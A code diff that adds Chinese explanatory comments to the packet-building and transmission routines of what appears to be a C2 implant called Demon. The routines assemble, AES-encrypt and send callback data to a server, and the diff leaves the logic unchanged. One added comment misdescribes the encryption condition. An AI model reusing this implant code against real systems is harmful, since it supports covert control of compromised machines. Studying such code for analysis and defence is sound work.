@@ -35,6 +35,7 @@ VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
     Buffer[ 0 ] = Value & 0xFF;
 }
 
+// 将int32数据转换为Buffer，自行处理大小端
 VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
 {
     ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
@@ -43,6 +44,8 @@ VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
     ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
 }
 
+// 向PACKAGE结构体中添加int32数据，添加到Buffer中
+// Buffer会调用LocalReAlloc来重新分配
 VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
 {
     if ( ! Package )
@@ -77,6 +80,7 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
     Package->Length += sizeof( UINT64 );
 }
 
+// 向PACKAGE结构体中添加数据，添加到Buffer中
 VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 {
     if ( ! Package )
@@ -117,6 +121,7 @@ VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 }
 
 // For callback to server
+// 创建PACKAGE结构体，并插入数据，CommandID决定了当前包的任务类型
 PPACKAGE PackageCreate( UINT32 CommandID )
 {
     PPACKAGE Package = NULL;
@@ -128,8 +133,8 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     Package->Encrypt   = TRUE;
     Package->Destroy   = TRUE;
 
-    PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
+    PackageAddInt32( Package, 0 ); // 整个包的长度，后面会填充
+    PackageAddInt32( Package, DEMON_MAGIC_VALUE ); // 用于标识当前是Demon
     PackageAddInt32( Package, Instance.Session.AgentID );
     PackageAddInt32( Package, CommandID );
 
@@ -171,6 +176,8 @@ VOID PackageDestroy( PPACKAGE Package )
     Package = NULL;
 }
 
+// 将PACKAGE结构体中的数据发送到服务器，并接收服务器返回的数据
+// 调整Package的数据
 BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 {
     AESCTX AesCtx  = { 0 };
@@ -185,6 +192,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
         }
 
         // writes package length to buffer
+        // 将整个包的长度写入Package Buffer的前4个字节
         Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
 
         if ( Package->Encrypt )
@@ -194,12 +202,14 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
             if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                 Padding += 32 + 16;
 
+            // Metadata没有加密并且CommandID不是DEMON_INITIALIZE时，才会加密
             if ( !( Instance.IsMetadataEncrypted && Package->CommandID == DEMON_INITIALIZE ) )
             {
                 AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
                 AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
             }
 
+            // 默认DEMON_INITIALIZED是加密的
             if (Package->CommandID == DEMON_INITIALIZE)
                 Instance.IsMetadataEncrypted = TRUE;
         }
@@ -219,6 +229,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
     return Success;
 }
 
+// 想服务器回传错误信息
 VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
 {
     PRINTF( "Transmit Error: %d\n", ErrorCode );
